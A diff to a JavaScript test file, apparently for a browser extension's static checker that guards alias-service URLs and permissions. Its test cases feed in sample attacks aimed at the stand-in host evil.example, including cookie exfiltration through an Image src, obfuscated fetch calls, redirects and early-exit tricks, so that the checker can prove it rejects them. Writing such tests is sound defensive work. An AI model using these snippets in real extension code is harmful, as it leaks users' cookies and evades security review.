@@ -79,10 +79,51 @@ test('the check fails when the alias module gains a third address', () => {
 });
 
 test('the check fails when a service URL is pointed at another host, however it is written', () => {
-  for (const url of ["'https://relay.firefox.com.evil.example/x'", "'https:' + '/' + '/evil.example' + '/x'", "'https://' + 'evil.example'"]) {
+  for (const url of [
+    "'https://relay.firefox.com.evil.example/x'",
+    "'https:' + '/' + '/evil.example' + '/x'",
+    "globalThis.process ? 'https://relay.firefox.com/api/v1/relayaddresses/' : 'x'",
+  ]) {
     const result = runWithAlias((t) => t.replace("'https://relay.firefox.com/api/v1/relayaddresses/'", url));
     assert.equal(result.status, 1, url);
-    assert.match(result.stderr, /service relay points outside the alias origins/, url);
+    assert.match(result.stderr, /service URLs must be exactly/, url);
+  }
+});
+
+test('the check fails when a service URL is rewritten later', () => {
+  const result = runWithAlias((t) => `${t}\nsetTimeout(() => { ALIAS_SERVICES.relay.url = 'x'; });\n`);
+  assert.equal(result.status, 1);
+  assert.match(result.stderr, /must not rewrite a service URL/);
+});
+
+test('shipped code cannot end the check early, because the check never runs it', () => {
+  const dir = copyProject();
+  for (const f of ['lib/alias.js', 'lib/addresses.js', 'lib/generate.js']) appendFileSync(join(dir, f), '\nglobalThis.process?.exit(0);\n');
+  const file = join(dir, 'manifest.json');
+  const manifest = JSON.parse(readFileSync(file, 'utf8'));
+  manifest.host_permissions = ['<all_urls>'];
+  writeFileSync(file, JSON.stringify(manifest, null, 2));
+  const result = run(dir);
+  assert.equal(result.status, 1);
+  assert.match(result.stderr, /host_permissions/);
+});
+
+test('the check fails on ways out of the page that avoid fetch and URLs', () => {
+  for (const [code, label] of [
+    ["new Image().src = 'https:' + '//evil.example?d=' + document.cookie;", /new Image|\.src assignment/],
+    ["window['fe' + 'tch']('https:' + '//evil.example');", /computed global access/],
+    ["globalThis['fet' + 'ch']('x');", /computed global access/],
+    ["location.href = 'https:' + '//evil.example';", /navigation/],
+    ["open('https:' + '//evil.example');", /open\(/],
+    ["document.body.insertAdjacentHTML('beforeend', '<img src=x>');", /HTML from a string/],
+    ["document.createElement('img');", /loading element/],
+    ["el.setAttribute('src', 'x');", /URL attribute/],
+  ]) {
+    const dir = copyProject();
+    appendFileSync(join(dir, 'lib/autofill.js'), `\n${code}\n`);
+    const result = run(dir);
+    assert.equal(result.status, 1, code);
+    assert.match(result.stderr, label, code);
   }
 });
 
